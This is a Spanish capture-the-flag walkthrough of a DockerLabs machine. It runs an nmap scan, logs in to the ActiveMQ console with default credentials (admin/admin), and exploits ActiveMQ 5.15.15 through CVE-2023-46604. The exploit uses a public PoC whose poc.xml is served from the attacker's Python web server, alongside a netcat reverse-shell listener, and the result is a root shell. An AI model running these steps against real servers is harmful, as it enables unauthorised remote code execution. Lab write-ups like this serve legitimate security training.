## Reconocimiento:

```bash
PORT      STATE SERVICE    VERSION
80/tcp    open  http       Apache httpd 2.4.59 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.59 (Debian)
443/tcp   open  ssl/http   Apache httpd 2.4.59 ((Debian))
|_http-server-header: Apache/2.4.59 (Debian)
| ssl-cert: Subject: commonName=example.com/organizationName=Your Organization/stateOrProvinceName=California/countryName=US
| Not valid before: 2024-04-17T08:32:44
|_Not valid after:  2025-04-17T08:32:44
|_http-title: DockerLabs | Plantilla gratuita Bootstrap 4.3.x
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
1883/tcp  open  mqtt
| mqtt-subscribe: 
|   Topics and their most recent payloads: 
|     ActiveMQ/Advisory/Consumer/Topic/#: 
|_    ActiveMQ/Advisory/MasterBroker: 
5672/tcp  open  amqp?
|_amqp-info: ERROR: AQMP:handshake expected header (1) frame, but was 65
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GetRequest, HTTPOptions, RPCCheck, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
|     AMQP
|     AMQP
|     amqp:decode-error
|_    7Connection from client using unsupported AMQP attempted
8161/tcp  open  http       Jetty 9.4.39.v20210325
|_http-title: Error 401 Unauthorized
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
|_http-server-header: Jetty(9.4.39.v20210325)
35891/tcp open  tcpwrapped
61613/tcp open  stomp      Apache ActiveMQ
| fingerprint-strings: 
|   HELP4STOMP: 
|     ERROR
|     content-type:text/plain
|     message:Unknown STOMP action: HELP
|     org.apache.activemq.transport.stomp.ProtocolException: Unknown STOMP action: HELP
|     org.apache.activemq.transport.stomp.ProtocolConverter.onStompCommand(ProtocolConverter.java:258)
|     org.apache.activemq.transport.stomp.StompTransportFilter.onCommand(StompTransportFilter.java:85)
|     org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
|     org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:233)
|     org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:215)
|_    java.base/java.lang.Thread.run(Thread.java:840)
61614/tcp open  http       Jetty 9.4.39.v20210325
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Jetty(9.4.39.v20210325)
|_http-title: Site doesn't have a title.
61616/tcp open  apachemq   ActiveMQ OpenWire transport
| fingerprint-strings: 
|   NULL: 
|     ActiveMQ
|     TcpNoDelayEnabled
|     SizePrefixDisabled
|     CacheSize
|     ProviderName 
|     ActiveMQ
|     StackTraceEnabled
|     PlatformDetails 
|     Java
|     CacheEnabled
|     TightEncodingEnabled
|     MaxFrameSize
|     MaxInactivityDuration
|     MaxInactivityDurationInitalDelay
|     ProviderVersion 
|_    5.15.15
```

En la web por el puerto 8161 nos pediran unas credenciales, que intuyo y acierto:

```bash
User : admin
Pass : admin
```

Dentro hay una pagina con un software llamado ActiveMQ con una versión vulnerable 5.15.15 por lo que vamos a buscar un exploit.

Encuentro uno en Github y lo clono a mi máquina:

```bash
git clone https://github.com/evkl1d/CVE-2023-46604.git
cd CVE-2023-46604/
```

Edito el archivo “poc.xml” y pongo mi IP atacante y el puerto para recibir la shell.

Luego abro un server de python para que pueda descargarse el poc.xml:

```bash
python3 -m http.server
```

En otra terminal me pongo a la escucha para recibir la shell:

```bash
nc -lvnp 4444
```

Y en otra terminal ejecuto el exploit:

```bash
python exploit.py -i 172.17.0.2 -u http://172.17.0.1:8000/poc.xml
```

Y nos devuelve una shell con privilegios de root.

Listo.
